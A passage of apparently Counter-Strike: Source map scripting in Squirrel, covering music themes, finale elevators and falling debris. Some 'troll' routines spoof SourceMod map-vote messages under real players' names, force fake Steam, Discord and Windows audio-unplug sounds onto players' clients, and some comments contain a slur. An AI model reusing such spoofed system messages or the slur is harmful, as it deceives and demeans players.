							{file="#music/luffaren_collective/forest.mp3", 						volume=10,		pitch=100,		duration=46.00		},
							{file="#music/luffaren_collective/laura_piano.mp3", 					volume=10,		pitch=100,		duration=44.00		},
							{file="#music/luffaren_collective/laura_piano.mp3", 					volume=10,		pitch=100,		duration=44.00		},
		],
		music_light = [
							{file="*luffaren/silenthill_siren.mp3", 							volume=10,		pitch=100,		duration=19.00,		silenthill_toggle=true},
							{file="*luffaren/silenthill_siren.mp3", 							volume=10,		pitch=100,		duration=19.00,		silenthill_toggle=true},
							{file="*luffaren/silenthill_siren.mp3", 							volume=10,		pitch=100,		duration=19.00,		silenthill_toggle=true},
							{file="#music/luffaren_collective/terror_in_the_depths.mp3", 		volume=5,		pitch=100,		duration=69.00		},
							{file="#music/luffaren_collective/true.mp3", 						volume=10,		pitch=100,		duration=57.00		},
							{file="#music/luffaren_collective/true.mp3", 						volume=10,		pitch=100,		duration=57.00		},
							{file="#music/luffaren_collective/forest.mp3", 						volume=10,		pitch=100,		duration=46.00		},
							{file="#music/luffaren_collective/forest.mp3", 						volume=10,		pitch=100,		duration=46.00		},
							{file="#music/luffaren_collective/laura_piano.mp3", 					volume=10,		pitch=100,		duration=44.00		},
							{file="#music/luffaren_collective/laura_piano.mp3", 					volume=10,		pitch=100,		duration=44.00		},
		],
		music_dark = [
							{file="*luffaren/silenthill_siren.mp3", 							volume=10,		pitch=100,		duration=19.00,		silenthill_toggle=true},
							{file="*luffaren/silenthill_siren.mp3", 							volume=10,		pitch=100,		duration=19.00,		silenthill_toggle=true},
							{file="#music/luffaren_collective/terror_in_the_depths.mp3", 		volume=5,		pitch=100,		duration=69.00		},
							{file="#music/luffaren_collective/black_fairy.mp3", 					volume=10,		pitch=100,		duration=25.00		},
							{file="#music/luffaren_collective/alive.mp3", 						volume=5,		pitch=100,		duration=50.00		},
							{file="#music/luffaren_collective/down_time.mp3", 					volume=10,		pitch=100,		duration=27.00		},
							{file="#music/luffaren_collective/down_time.mp3", 					volume=10,		pitch=100,		duration=27.00		},
							{file="#music/luffaren_collective/ill_kill_you.mp3", 				volume=10,		pitch=100,		duration=57.00		},
							{file="#music/luffaren_collective/silent_heaven.mp3", 				volume=10,		pitch=100,		duration=44.00		},
							
		],
		fog_color = Vector(100,100,100),
		fog_start = -1000.00,
		fog_end = 5000.00,
		fog_density = 1.00,
		fog_farz = 600000.00,
		function SkyboxSetup()
		{
			EntFire("skyboxswapper","AddOutput","SkyboxName basicsky",0.00,null);
			EntFire("skyboxswapper","Trigger","",0.05,null);
			//::manager.PrecacheModel("models/luffaren/collective_skybox_clouds.mdl");
			for(local i=0;i<2;i++)
				::Ent(Vector(0,0,-(0+::TELEHURT_Z_OFFSET+300)),Vector(0,RandomInt(0,360),0),"prop_dynamic",{
						model="models/luffaren/collective_skybox_clouds.mdl",
						spawnflags = "64",
						modelscale = 15,
						rendermode = 0,		//__CSS__ og was 2
						renderamt = 0,
						rendercolor = "100 100 100",
						targetname = "skybox_master",
					},{function Move(){
						try{self.SetOrigin(Vector(self.GetOrigin().x,self.GetOrigin().y,
						::MAPDATA[::manager.GetScriptScope().mapspawnindex].end_pos.z+(-(::TELEHURT_Z_OFFSET+300))));}catch(e){}
					},function Run(){
						local ii=0.00;for(local alpha=0;alpha<255;alpha+=5){
							EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
							ii += 0.05;}EntFireByHandle(self,"AddOutput","renderamt 255",ii,null,null);
					}});
		},
	},
};
::THEMES <- {};	//dynamic list, gets filled with the persistent ::THEMES_BASE^ every new round, and can then be altered safely
foreach(k,v in ::THEMES_BASE)
{
	::THEMES[k] <- {};
	foreach(kk,vv in v)
	{
		::THEMES[k][kk] <- vv;
	}
}

::TrollMapVote_enabled <- true;
::TrollMapVote_nomplayers <- [];
::TrollMapVote_maps <- [
	{	name="ze_blackmesa_lambda",				votes=0	}
	{	name="ze_infiltration_final_css2",		votes=0	}
	{	name="ze_predator_ultimate_v3",			votes=0	}
	{	name="ze_toaster_v1_2",					votes=0	}
	{	name="ze_halo_poa",						votes=0	}
	{	name="ze_interception_b4",				votes=0	}
	{	name="ze_frostdrake_tower_v1s",			votes=0	}
	{	name="ze_castlevania_v1_3",				votes=0	}
	{	name="ze_santassination_css2",			votes=0	}
	{	name="ze_diddle_css",					votes=0	}
	{	name="ze_pizzatime_v4s",				votes=0	}
	{	name="ze_best_korea_css",				votes=0	}
	{	name="ze_magmadrake_beta2",				votes=0	}
	{	name="ze_anubis_v1s",					votes=0	}
	{	name="ze_eternal_grove_v3_css",			votes=0	}
	{	name="ze_crazykart_v4s",				votes=0	}
	{	name="ze_collective_css1",				votes=0	}
];
::TrollMapVote <- function()
{
	local map = ::TrollMapVote_maps[RandomInt(0,::TrollMapVote_maps.len()-1)];
	local percentage = RandomInt(50,80).tostring();
	local votes = RandomInt(32,64).tostring();
	ScriptPrintMessageChatAll("Server cvar 'sm_nextmap' changed to "+map.name);
	ScriptPrintMessageChatAll("\x04 [SM]\x05 Map voting has finished. The next map will be "+map.name+". [Received "+percentage+"% of "+votes+" votes]");
}
::TrollMapNom <- function()
{
	local map = ::TrollMapVote_maps[RandomInt(0,::TrollMapVote_maps.len()-1)];
	local playername = null;
	local foundplayername = false;
	for(local attempts=0;attempts<50;attempts++)
	{
		try{
			local pc = ::PLAYERS[RandomInt(0,::PLAYERS.len()-1)];
			if(pc==null)continue;
			if(pc.handle==null||!pc.handle.IsValid())continue;
			if(pc.name==null||pc.name==""||pc.name.find("user")==0)continue;
			playername = ""+pc.name;
			break;
		}catch(e){}
	}
	if(playername==null)return;
	map.votes++;
	local votes = ""+map.votes.tostring();
	local votesay = "vote";
	if(map.votes>1)votesay = "votes";
	foreach(p in ::TrollMapVote_nomplayers)
	{
		if(p.name == playername)
		{
			foreach(map in ::TrollMapVote_maps)
			{
				if(p.mapname == map.name)
				{
					map.votes--;
					if(map.votes<0)map.votes = 0;
					break;
				}
			}
			p.mapname=""+map.name;
			ScriptPrintMessageChatAll("\x04 [SM]\x05 "+playername+" has changed their nomination to "+map.name+". ["+votes+" "+votesay+"].");
			return;
		}
	}
	::TrollMapVote_nomplayers.push({name=""+playername,mapname=""+map.name});
	ScriptPrintMessageChatAll("\x04 [SM]\x05 "+playername+" has nominated "+map.name+". ["+votes+" "+votesay+"].");
}
TrollMapVoteNomTick_min <- 0.10;
TrollMapVoteNomTick_max <- 1000.00;
TrollMapVoteNomTick_votechance <- 20.00;
function TrollMapVoteNomTick()
{
	EntFireByHandle(self,"RunScriptCode","TrollMapVoteNomTick();",RandomFloat(TrollMapVoteNomTick_min,TrollMapVoteNomTick_max),null,null);
	if(!::TrollMapVote_enabled)return;
	if(RandomFloat(0.00,100.00)<=TrollMapVoteNomTick_votechance)
		::TrollMapVote();
	else
		::TrollMapNom();
}
EntFireByHandle(::manager,"RunScriptCode","TrollMapVoteNomTick();",RandomFloat(TrollMapVoteNomTick_min,TrollMapVoteNomTick_max),null,null);

steam_discord_trollping <- true;
steam_discord_trollping_rate_min <- 0.10;
steam_discord_trollping_rate_max <- 300.00;
steam_discord_trollping_minplayers <- 5;
steam_discord_trollping_sounds <- [
		"*luffaren/steam_message.mp3",
		"*luffaren/steam_message.mp3",
		"*luffaren/steam_message.mp3",
		"*luffaren/discord_message.mp3",
		"*luffaren/discord_message.mp3",
		"*luffaren/discord_message.mp3",
		"*luffaren/discord_message.mp3",
		"*luffaren/discord_message.mp3",
		"*luffaren/discord_leave.mp3",
		"*luffaren/discord_leave.mp3",
	];
function SteamDiscordTrollPing()
{
	EntFireByHandle(self,"RunScriptCode"," SteamDiscordTrollPing(); ",RandomFloat(steam_discord_trollping_rate_min,steam_discord_trollping_rate_max),null,null);
	if(!steam_discord_trollping)return;
	local victims = [];
	for(local h;h=Entities.FindByClassname(h,"player");)
	{
		if(h==null||!h.IsValid())continue;
		victims.push(h);
	}
	if(victims.len() < steam_discord_trollping_minplayers)return;
	local victim = victims[RandomInt(0,victims.len()-1)];
	EntFire("client","Command","play "+steam_discord_trollping_sounds[RandomInt(0,steam_discord_trollping_sounds.len()-1)],0.00,victim);
}
EntFireByHandle(::manager,"RunScriptCode"," SteamDiscordTrollPing(); ",RandomFloat(steam_discord_trollping_rate_min,steam_discord_trollping_rate_max),null,null);

WindowsAudio_rate_min <- 16.00;
WindowsAudio_rate_max <- 600.00;
WindowsAudio_minplayers <- 5;
function WindowsAudio()
{
	EntFireByHandle(self,"RunScriptCode","WindowsAudio();",RandomFloat(WindowsAudio_rate_min,WindowsAudio_rate_max),null,null);
	local candidates = [];
	for(local h;h=Entities.FindByClassname(h,"player");)
	{
		if(h==null||!h.IsValid()||h.IsAlive()==false)continue;
		if(h.GetTeam()==2||h.GetTeam()==3){}else continue;
		candidates.push(h);
	}
	if(candidates.len()<=0)return;
	if(candidates.len()<WindowsAudio_minplayers)return;
	local p = candidates[RandomInt(0,candidates.len()-1)];
	local timeofs = RandomInt(5,15);
	local pq = [];
	pq.push({qrate=0.37,p=p,function Run(){::Sound("*luffaren/windows_plug_out.mp3",Vector(),p,-1);}});
	pq.push({qrate=timeofs+0.15,p=p,timeofs=timeofs,function Run(){EntFire("client","Command","soundfade 100 "+timeofs.tostring()+" 0 0",0.00,p);}});
	pq.push({qrate=0.20,p=p,function Run(){::Sound("*luffaren/windows_plug_in.mp3",Vector(),p,-1);}});
	::Process(pq,0.05);
}
EntFireByHandle(::manager,"RunScriptCode","WindowsAudio();",RandomFloat(WindowsAudio_rate_min,WindowsAudio_rate_max),null,null);

hornsound_enabled <- false;
hornsound_state <- 1;
hornsound_rate_min <- 9.00;
hornsound_rate_max <- 100.00;
function HornSound()
{
	EntFireByHandle(self,"RunScriptCode"," HornSound(); ",RandomFloat(hornsound_rate_min,hornsound_rate_max),null,null);
	if(!hornsound_enabled)return;
	::Sound("*luffaren/horn"+hornsound_state.tostring()+"_default.mp3",Vector(),null,0,10,RandomInt(98,102),10);
	hornsound_state++;if(hornsound_state>2)hornsound_state=1;
}

EntFireByHandle(::manager,"RunScriptCode"," HornSound(); ",RandomFloat(hornsound_rate_min,hornsound_rate_max),null,null);
::FINALE_ENDING <- {
		pyramid_size = 10,					//the X*Y size of the pyramid
		pyramid_stepheight = 60,			//how tall each pyramid step is
		final_holdtime = 40.00,				//relative from ~10s after Run() is called
		rubble_disable_delay = 55.00,		//relative to when Run() is called, disables the RNG debris falling from above
	function Run()//called when '::finale_escape_levelamount' has been reached during the finale end (this will stop the stage spawning too)
	{
		EntFire("manager","RunScriptCode"," EventEvaluate_InfFinaleTick_ticking = false; ",5.00,null);
		::FinaleEscapeInfiniteKamikaze_ticking = false;
		EntFire("manager","RunScriptCode"," noprint = true; ",0.00,null);
		EntFire("manager","RunScriptCode"," finalerubble_ticking--; ",rubble_disable_delay,null);
		::DisableMapImages();
		::ServerSay("say "+::finalecpf+" YOU REACHED THE END",0.00,null);
		::ServerSay("say "+::finalecpf+" YOU REACHED THE END",0.01,null);
		::ServerSay("say "+::finalecpf+" YOU REACHED THE END",0.02,null);
		::ServerSay("say "+::finalecpf+" THE TOP OF THE PYRAMID IS YOUR ESCAPE",8.00,null);
		::ServerSay("say "+::finalecpf+" THE TOP OF THE PYRAMID IS YOUR ESCAPE",8.01,null);
		::ServerSay("say "+::finalecpf+" THE TOP OF THE PYRAMID IS YOUR ESCAPE",8.02,null);
		::ServerSay("say "+::finalecpf+" DEFEND IT WITH YOUR LIFE",9.03,null);
		::ServerSay("say "+::finalecpf+" DEFEND IT WITH YOUR LIFE",9.04,null);
		::ServerSay("say "+::finalecpf+" DEFEND IT WITH YOUR LIFE",9.05,null);
		if(::finale_ending_kamikaze_delay!=null)
		{
			EntFire("manager","RunScriptCode"," ::EVENTS.KAMIKAZE.Run() ",::finale_ending_kamikaze_delay,null);
		}
		EntFire("manager","RunScriptCode"," ::FINALE_ENDING.SetupElevators(); ",7.00,null);
		EntFire("manager","RunScriptCode"," ::FINALE_ENDING.StartDefense(); ",10.00,null);
		local man = ::manager.GetScriptScope();
		local md = ::MAPDATA[man.mapspawnindex-1];
		local direction_next_left = ::AnglesToDir(::DirToAngles(md.direction_next)+Vector(0,90,0));
		local randyaw = [0,90,180,270];
		local spawnlist = [//+x:forward, +y:left, +z:up(elevation)		OPTIONAL PARAM:targetname="",
				//{x=0,		y=0,	z=0.00,		yaw=null,	index=5,	targetname="block_finale_end_X"},
			];
		for(local x=0;x<pyramid_size;x++)
		{
			for(local y=0;y<pyramid_size;y++)
			{
				local xval = (0+x);
				local yval = (0+y);
				if(xval>=(pyramid_size/2))xval = abs(xval-((pyramid_size)-1));
				if(yval>=(pyramid_size/2))yval = abs(yval-((pyramid_size)-1));
				local index = (0+xval);
				if((0+yval)<index)index = (0+yval);
				index++;
				spawnlist.push({x=x,	y=y-((pyramid_size/2)-0.5),	z=0.00,		yaw=null,	index=5,	targetname="block_finale_"+index.tostring()});
			}
		}
		foreach(s in spawnlist)
		{
			::THEME = man.randomtheme_buffer[RandomInt(0,man.randomtheme_buffer.len()-1)];
			local model = ::TILEVARIANTS[::TYPES[s.index].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[s.index].name][::THEME].main.len()-1)];
			local spawndata = {pos=Vector(),yaw=randyaw[RandomInt(0,randyaw.len()-1)]};
			if(s.yaw!=null)spawndata.yaw = s.yaw;
			spawndata.pos = Vector()+md.end_pos+(md.direction_next*(man.GRID_SIZE/2))+	//start position, 3 width would be centered with this
				(md.direction_next*(s.x*man.GRID_SIZE))+
				(direction_next_left*(s.y*man.GRID_SIZE))+
				Vector(0,0,s.z*man.ELEVATION);
			local sq = {index=s.index,spawnindex=99999,color=Vector(255,255,255),modelname=model};
			if("targetname" in s)sq.targetname <- s.targetname;
			::SpawnQueue.push(sq);
			::SpawnQueueSpawner.push(spawndata);
		}
	},
	function SetupElevators()
	{
		local fheight = 0.00;
		for(local i=2;i<=(pyramid_size/2);i++)
		{
			if(i<(pyramid_size/2))fheight += pyramid_stepheight;
			::Ent(Vector(),Vector(),"func_movelinear",{
					movedir = "-90 0 0",
					movedistance = 0+fheight,
					speed = 20,
					blockdamage = 999999,
					spawnflags = 8,
					targetname = "finaleelevator_"+i.tostring(),
				},{
				index = 0+i,
				fholdtime = final_holdtime,
				function Run(){
					EntFire("block_finale_"+index.tostring(),"SetParent","!activator",0.00,self);
					
					//__CSS__ this prevents debris from hitting the final elevator when it leaves
					EntFire("manager","RunScriptCode","::DEBRIS_NONSOLID=true;",fholdtime+0.90,null);
					self.AddFlag(2147483648) //FL_UNBLOCKABLE_BY_PLAYER
					
				}});
		}
		EntFire("finaleelevator_*","Open","",0.50,null);
	},
	function StartDefense()
	{
		EntFire("manager","RunScriptCode"," ::FINALE_ENDING.RaiseFinalElevator(); ",final_holdtime,null);
		::ServerSay("say "+::finalecpf+" DEFEND FOR "+final_holdtime.tostring()+"s",0.00,null);
		::ServerSay("say "+::finalecpf+" DEFEND FOR "+final_holdtime.tostring()+"s",0.01,null);
		::ServerSay("say "+::finalecpf+" DEFEND FOR "+final_holdtime.tostring()+"s",0.02,null);
		local ii = 0.00;
		ii=(0.00+final_holdtime-30.00);if(ii>0.00)::ServerSay("say "+::finalecpf+" RISING IN 30s",ii,null);
		ii=(0.00+final_holdtime-20.00);if(ii>0.00)::ServerSay("say "+::finalecpf+" RISING IN 20s",ii,null);
		ii=(0.00+final_holdtime-10.00);if(ii>0.00)::ServerSay("say "+::finalecpf+" RISING IN 10s",ii,null);
		ii=(0.00+final_holdtime-5.00);if(ii>0.00)::ServerSay("say "+::finalecpf+" RISING IN 5s",ii,null);
		ii=(0.00+final_holdtime-4.00);if(ii>0.00)::ServerSay("say "+::finalecpf+" RISING IN 4s",ii,null);
		ii=(0.00+final_holdtime-3.00);if(ii>0.00)::ServerSay("say "+::finalecpf+" RISING IN 3s",ii,null);
		ii=(0.00+final_holdtime-2.00);if(ii>0.00)::ServerSay("say "+::finalecpf+" RISING IN 2s",ii,null);
		ii=(0.00+final_holdtime-1.00);if(ii>0.00)::ServerSay("say "+::finalecpf+" RISING IN 1s",ii,null);
		::ServerSay("say "+::finalecpf+" RISING",final_holdtime+0.00,null);
		::ServerSay("say "+::finalecpf+" RISING",final_holdtime+0.01,null);
		::ServerSay("say "+::finalecpf+" RISING",final_holdtime+0.02,null);
	}
	function RaiseFinalElevator()
	{
		//EntFire("manager","RunScriptCode","TeamWin();",0.00,null); 											//__CSS__ css4_no_solofagging
		foreach(twtime in ::teamwin_timings)EntFire("manager","RunScriptCode","TeamWin();",twtime,null);		//__CSS__ css4_no_solofagging
		EntFire("finale_skyboxrot","Stop","",0.00,null);
		::Ent(Vector(),Vector(),"func_movelinear",{
				movedir = "-90 0 0",
				movedistance = 800,
				speed = 60,
				blockdamage = 999999,
				spawnflags = 8,
				targetname = "finaleelevator_win",
			},{
			function Run(){
				EntFire("manager","RunScriptCode"," EnableMassKillerAll(); ",100.00,null);
				EntFire("block_finale_"+((::FINALE_ENDING.pyramid_size/2)-0).tostring(),"SetParent","!activator",0.00,self);
				EntFire("block_finale_"+((::FINALE_ENDING.pyramid_size/2)-1).tostring(),"SetParent","!activator",0.00,self);
				EntFire("block_finale_"+((::FINALE_ENDING.pyramid_size/2)-0).tostring(),"AddOutput","targetname finalewinblock",0.05,null);
				EntFire("block_finale_"+((::FINALE_ENDING.pyramid_size/2)-1).tostring(),"AddOutput","targetname finalewinblock",0.05,null);
				EntFireByHandle(self,"Open","",0.10,null,null);
			}});
		
		local tcount = 0;
		for(local h;h=Entities.FindByClassname(h,"player");)
		{
			if(h==null||!h.IsValid()||h.GetTeam()!=2||h.IsAlive()==false)continue;
			tcount++;
		}
		if(tcount<=0)
		{
			local legit = " (SID:"+::SESSION_ID+")";
			if(!::legit_win)legit = " *NOT LEGIT* (SID:"+::SESSION_ID+")";
			if(!::finale_checkout_checked)
			{
				::ServerSay("say [FINALE ENDING] NO ZOMBIES ALIVE - YOU WON BY DEFAULT!"+legit,0.00,null);
				::ServerSay("say [FINALE ENDING] NO ZOMBIES ALIVE - YOU WON BY DEFAULT!"+legit,0.01,null);
				::ServerSay("say [FINALE ENDING] NO ZOMBIES ALIVE - YOU WON BY DEFAULT!"+legit,0.02,null);
				printl("[FINALE ENDING] NO ZOMBIES ALIVE - YOU WON BY DEFAULT!"+legit);
			}
			else
			{
				::ServerSay("say [INFINITE FINALE ENDING] NO ZOMBIES ALIVE - YOU WON BY DEFAULT!"+legit+" ("+::finale_checkout_mapspawnindex.tostring()+" levels | "+maps.len().tostring()+" map_pool)",0.00,null);
				::ServerSay("say [INFINITE FINALE ENDING] NO ZOMBIES ALIVE - YOU WON BY DEFAULT!"+legit+" ("+::finale_checkout_mapspawnindex.tostring()+" levels | "+maps.len().tostring()+" map_pool)",0.01,null);
				::ServerSay("say [INFINITE FINALE ENDING] NO ZOMBIES ALIVE - YOU WON BY DEFAULT!"+legit+" ("+::finale_checkout_mapspawnindex.tostring()+" levels | "+maps.len().tostring()+" map_pool)",0.02,null);
				printl("[INFINITE FINALE ENDING] NO ZOMBIES ALIVE - YOU WON BY DEFAULT!"+legit+" ("+::finale_checkout_mapspawnindex.tostring()+" levels | "+maps.len().tostring()+" map_pool)");
			}
			::RoundWon(false);
		}
		else
		{
			::ListenRoundEnd({function RoundEnd(winner,data){
					if(::round_already_won){printl("::ListenRoundEnd - round already won - ignoring");return;};
					printl("ListenRoundEnd: "+winner+" (3:CT, 2=T, 1=DRAW, null=BUGGED)");
					
					//if(winner==3)
					if(winner==3 && ::teamwin)		//__CSS__ css4_no_solofagging (og line above)
					{
						local legit = "CONGRATULATIONS! (SID:"+::SESSION_ID+")";
						if(!::legit_win)legit = "*NOT LEGIT* (SID:"+::SESSION_ID+")";
						if(!::finale_checkout_checked)
						{
							::ServerSay("say [FINALE ENDING] YOU WON - "+legit,0.00,null);
							::ServerSay("say [FINALE ENDING] YOU WON - "+legit,0.01,null);
							::ServerSay("say [FINALE ENDING] YOU WON - "+legit,0.02,null);
							::ServerSay("say [FINALE ENDING] YOU WON - "+legit,0.03,null);
							::ServerSay("say [FINALE ENDING] YOU WON - "+legit,0.04,null);
							printl("[FINALE ENDING] YOU WON - "+legit);
						}
						else
						{
							::ServerSay("say [INFINITE FINALE ENDING] YOU WON - "+legit+" ("+::finale_checkout_mapspawnindex.tostring()+" levels | "+maps.len().tostring()+" map_pool)",0.00,null);
							::ServerSay("say [INFINITE FINALE ENDING] YOU WON - "+legit+" ("+::finale_checkout_mapspawnindex.tostring()+" levels | "+maps.len().tostring()+" map_pool)",0.01,null);
							::ServerSay("say [INFINITE FINALE ENDING] YOU WON - "+legit+" ("+::finale_checkout_mapspawnindex.tostring()+" levels | "+maps.len().tostring()+" map_pool)",0.02,null);
							::ServerSay("say [INFINITE FINALE ENDING] YOU WON - "+legit+" ("+::finale_checkout_mapspawnindex.tostring()+" levels | "+maps.len().tostring()+" map_pool)",0.03,null);
							::ServerSay("say [INFINITE FINALE ENDING] YOU WON - "+legit+" ("+::finale_checkout_mapspawnindex.tostring()+" levels | "+maps.len().tostring()+" map_pool)",0.04,null);
							printl("[INFINITE FINALE ENDING] YOU WON - "+legit+" ("+::finale_checkout_mapspawnindex.tostring()+" levels | "+maps.len().tostring()+" map_pool)");
						}
						::RoundWon();
					}
					else
					{
						if(!::finale_checkout_checked)
							::ServerSay("say [FINALE ENDING] YOU LOST!",0.00,null);
						else
							::ServerSay("say [INFINITE FINALE ENDING] YOU LOST!",0.00,null);
					}
				}});
		}
		EntFire("manager","RunScriptCode"," EnableSpawnKiller(); ",0.10,null);
		local pq = [
				{qrate=0.20,function Run(){}},
				{qrate=0.20,function Run(){}},
				{qrate=0.20,function Run(){
					local pqq = [];
					local killblocks = [];
					for(local h;h=Entities.FindByName(h,"block_*");){killblocks.push(h);}
					while(killblocks.len()>0)
					{
						local kidx = RandomInt(0,killblocks.len()-1);
						local h = killblocks[kidx];
						killblocks.remove(kidx);
						pqq.push({h=h,function Run(){
							
							
							::CollapseTile(h,function(hh){
								hh.AcceptInput("DisableMotion","",null,null);
								EntFireByHandle(hh,"ClearParent","",0.00,null,null);
								EntFireByHandle(hh,"EnableMotion","",0.05,null,null);
								EntFireByHandle(hh,"AddOutput","rendermode 1",0.00,null,null);
								EntFireByHandle(hh,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
								local ii = 0.80;
								for(local alpha=255;alpha>0;alpha-=20)
								{
									EntFireByHandle(hh,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
									ii += 0.02;
								}
								EntFireByHandle(hh,"Kill","",ii,null,null);
							});
							//EntFireByHandle(h,"ClearParent","",0.00,null,null);
							//EntFireByHandle(h,"EnableMotion","",0.05,null,null);
							//EntFireByHandle(h,"AddOutput","rendermode 1",0.00,null,null);
							//EntFireByHandle(h,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
							//local ii = 0.80;
							//for(local alpha=255;alpha>0;alpha-=20)
							//{
							//	EntFireByHandle(h,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
							//	ii += 0.02;
							//}
							//EntFireByHandle(h,"Kill","",ii,null,null);
							
							
						}});
					}
					::Process(pqq,0.02);
				}},
			];
		::Process(pq,0.20);
	},
};

thunderfx_ticking <- true;
thunderfx_rate_min <- 0.01;
thunderfx_rate_max <- 0.50;
thunderfx_sound_chance <- 30.00;
function TickThunderFX()
{
	if(!thunderfx_ticking)return;
	EntFireByHandle(self,"RunScriptCode"," TickThunderFX(); ",RandomFloat(thunderfx_rate_min,thunderfx_rate_max),null,null);
	SetPrecipitation(2);
	local spos2 = pos+(::AnglesToDir(Vector(0,RandomFloat(0,360),0))*RandomFloat(10000,15000))+Vector(0,0,RandomFloat(2000,8000));
	if(spos2.x < -14000)spos2.x = -14000;else if(spos2.x > 14000)spos2.x = 14000;
	if(spos2.y < -14000)spos2.y = -14000;else if(spos2.y > 14000)spos2.y = 14000;
	if(spos2.z < -14000)spos2.z = -14000;else if(spos2.z > 14000)spos2.z = 14000;
	local scale = RandomFloat(20.00,80.00);
	local startframe = RandomInt(1,3);
	for(local i=0;i<1;i++)
	{
		::Ent(spos2,Vector(),"env_sprite",{
				spawnflags = 1,
				framerate = 50,
				frame = startframe,
				model = "materials/luffaren/thunder_animsprite.vmt",
				scale = scale,
				rendermode = 7,
			},{function Run(){
				EntFireByHandle(self,"Kill","",RandomFloat(0.05,0.30),null,null);
			}});
	}
	if(RandomFloat(0.00,100.00) <= thunderfx_sound_chance)
	{
		::Sound("*luffaren/thunder_dist_2.mp3",Vector(),null,0,0.50,RandomInt(30,170),RandomInt(1,10));
		if(RandomFloat(0.00,100.00) <= thunderfx_sound_chance)
			::Sound("*luffaren/thunder_dist_"+RandomInt(1,3).tostring()+".mp3",Vector(),null,0,0.50,RandomInt(90,110),RandomInt(1,10));
	}
}

finalerubble_ticking <- 0;
finalerubble_touchdamage <- 11;
finalerubble_touchdamage_infinite <- 16;			//during infinite finale
finalerubble_rate_min <- 0.05;
finalerubble_rate_max <- 0.70;
finalerubble_lifetime <- 7.00;
::finalerubble_ct_only <- true;
finalerubble_target <- null;
::finalerubble_dmg_sethealth_addoutput <- true;		//true:sethealth false:addoutput-health
finalerubble_random_bounds <- Vector(3000,4000,5000);		//x:XY, y:Zmin, z:Zmax
finalerubble_piecelist <- [
		//{		index=25,		mins=Vector(-0,-0,-0),		maxs=Vector(0,0,0)		},
	{		index=25,		mins=Vector(-48,-48,-30),		maxs=Vector(48,48,0)		},		//platform
	{		index=5,		mins=Vector(-48,-48,-930),		maxs=Vector(48,48,0)		},		//floor
	{		index=91,		mins=Vector(-48,-48,0),			maxs=Vector(48,48,150)		},		//breakable
	{		index=95,		mins=Vector(-48,-48,0),			maxs=Vector(48,48,150)		},		//generichold
	{		index=3,		mins=Vector(-48,-16,0),			maxs=Vector(-47,16,608)		},		//ladder
];
function TickFinaleRubble()
{
	EntFireByHandle(self,"RunScriptCode"," TickFinaleRubble(); ",RandomFloat(finalerubble_rate_min,finalerubble_rate_max),null,null);
	if(finalerubble_ticking<=0)return;
	if(finalerubble_target==null||!finalerubble_target.IsValid()||finalerubble_target.IsAlive()==false || finalerubble_target.GetTeam()!=3 && ::finalerubble_ct_only)
	{
		finalerubble_target = null;
		local pcand = [];
		for(local h;h=Entities.FindByClassname(h,"player");)
		{
			if(h==null||!h.IsValid()||h.IsAlive()==false)continue;
			if(::finalerubble_ct_only && h.GetTeam()!=3)continue;
			pcand.push(h);
		}
		if(pcand.len()<=0)return;
		finalerubble_target = pcand[RandomInt(0,pcand.len()-1)];
	}
	local spos = finalerubble_target.GetOrigin()+(::AnglesToDir(Vector(0,RandomFloat(0,360),0))*RandomFloat(0,finalerubble_random_bounds.x))+
		Vector(0,0,RandomFloat(finalerubble_random_bounds.y,finalerubble_random_bounds.z));
	local srot = Vector(RandomFloat(0,360),RandomFloat(0,360),RandomFloat(0,360));
	local piece = finalerubble_piecelist[RandomInt(0,finalerubble_piecelist.len()-1)];
	::SpawnDebris(spos,srot,finalerubble_lifetime,finalerubble_touchdamage,piece.index,piece.mins,piece.maxs);
}
EntFireByHandle(::manager,"RunScriptCode"," TickFinaleRubble(); ",0.40,null,null);






::DEBRIS_NONSOLID <- false;	//__CSS__ this makes the debris non-solid shortly after-spawn

::SpawnDebris <- function(pos,rot,lifetime,damage,tile_index,mins,maxs)
{
	if(::finale_started)::THEME = ::manager.GetScriptScope().randomtheme_buffer[RandomInt(0,::manager.GetScriptScope().randomtheme_buffer.len()-1)];
	local model = ::TILEVARIANTS[::TYPES[tile_index].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[tile_index].name][::THEME].main.len()-1)];
	//::manager.PrecacheModel(model);
	::Ent(pos,rot,"prop_physics_override",{
			model = model,
			spawnflags = 14,	//8:"motion disabled" + 2:"don't take physics damage" + 4:"debris"
			body = 1,			//gives it the cracked body
			rendermode = 1,
			renderamt = 0,
			DisableBoneFollowers = true,
		},{
		mins = mins,
		maxs = maxs,
		lifetime = lifetime,
		damage = damage,
		function Run(){
			EntFireByHandle(self,"Kill","",lifetime,null,null);
			EntFireByHandle(self,"RunScriptCode","self.SetSolid(5);",0.02,null,null);	//NEW in v1_7 - allows bullets to pass through
			EntFireByHandle(self,"EnableMotion","",0.10,null,null);
			local spos = Vector() + self.GetOrigin();
			local srot = Vector() + self.GetAngles();
			
			
			//__CSS__ new feature (used for finale start+final elevator)
			if(::DEBRIS_NONSOLID)
				EntFireByHandle(self,"RunScriptCode","self.SetSolid(0);",1.50,null,null);
			
			
			local kvs = {spawnflags = 1};
			if(::finalerubble_ct_only)kvs.filtername <- "filter_ct";
			::Ent(spos,srot,"trigger_multiple",kvs,{
				master = self,
				damage = damage,
				mins = mins,
				maxs = maxs,
				touchers = [],
				function Touch(){
					local toucher = activator;	//__CSS__ activator may get reset, store toucher
					if(toucher==null||!toucher.IsValid())return;
						//if(::finalerubble_ct_only && toucher.GetTeam()!=3)return;	//replaced with filter^
					foreach(t in touchers){if(t == toucher)return;}
					touchers.push(toucher);
					local newhp = (toucher.GetHealth()-damage);
					if(newhp <= 0 || ::finalerubble_dmg_sethealth_addoutput)
						EntFireByHandle(toucher,"SetHealth",newhp.tostring(),0.00,null,null);
					else
						EntFireByHandle(toucher,"AddOutput","health "+newhp.tostring(),0.00,null,null);
				},function Run(){
					//EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
					//local smins = ""+mins.x+" "+mins.y+" "+mins.z;
					//local smaxs = ""+maxs.x+" "+maxs.y+" "+maxs.z;
					//EntFireByHandle(self,"AddOutput","mins "+smins,0.00,null,null);
					//EntFireByHandle(self,"AddOutput","maxs "+smaxs,0.00,null,null);
